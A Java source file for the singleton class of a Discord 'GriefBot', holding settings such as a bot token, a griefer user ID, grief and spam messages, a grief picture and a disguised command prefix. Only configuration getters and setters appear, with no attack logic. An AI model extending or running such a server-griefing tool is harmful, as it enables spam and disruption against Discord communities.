package de.corruptedbytes;

import java.util.List;

import de.corruptedbytes.disguise.CommandManager;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.sharding.ShardManager;

public class GriefBot {

	private final static GriefBot INSTANCE = new GriefBot();
	private final CommandManager commandManager = new CommandManager();
	ShardManager botManager;

	private final String version = "v5.4.2";
	
	private String discordBotToken;
	private String grieferUserID;
	private String activityDescription;
	private String griefMessage;
	private String spamMessage;
	private String disguiseCommandPrefix;
	private int webServerPort;
	private String griefPicture;
	

	public static GriefBot getInstance() {
		return INSTANCE;
	}

	public CommandManager getCommandManager() {
		return commandManager;
	}

	public ShardManager getBotManager() {
		return botManager;
	}

	public String getDiscordBotToken() {
		return discordBotToken;
	}

	public void setDiscordBotToken(String discordBotToken) {
		this.discordBotToken = discordBotToken;
	}

	public String getGrieferUserID() {
		return grieferUserID;
	}

	public void setGrieferUserID(String grieferUserID) {
		this.grieferUserID = grieferUserID;
	}

	public String getActivityDescription() {
		return activityDescription;
	}

	public void setActivityDescription(String activityDescription) {
		this.activityDescription = activityDescription;
	}

	public String getGriefMessage() {
		return griefMessage;
	}

	public void setGriefMessage(String griefMessage) {
		this.griefMessage = griefMessage;
	}

	public String getSpamMessage() {
		return spamMessage;
	}

	public void setSpamMessage(String spamMessage) {
		this.spamMessage = spamMessage;
	}

	public String getDisguiseCommandPrefix() {
		return disguiseCommandPrefix;
	}

	public void setDisguiseCommandPrefix(String disguiseCommandPrefix) {
		this.disguiseCommandPrefix = disguiseCommandPrefix;
	}
	
	public List<Guild> getGuilds() {
		return getInstance().getBotManager().getGuilds();
	}
	
	public String getVersion() {
		return version;
	}
	
	public void setGriefPicture(String griefPicture) {
		this.griefPicture = griefPicture;
	}
	
	public String getGriefPicture() {
		return griefPicture;
	}
	
	public void setWebServerPort(int webServerPort) {
		this.webServerPort = webServerPort;
	}
	
	public int getWebServerPort() {
		return webServerPort;
	}
}
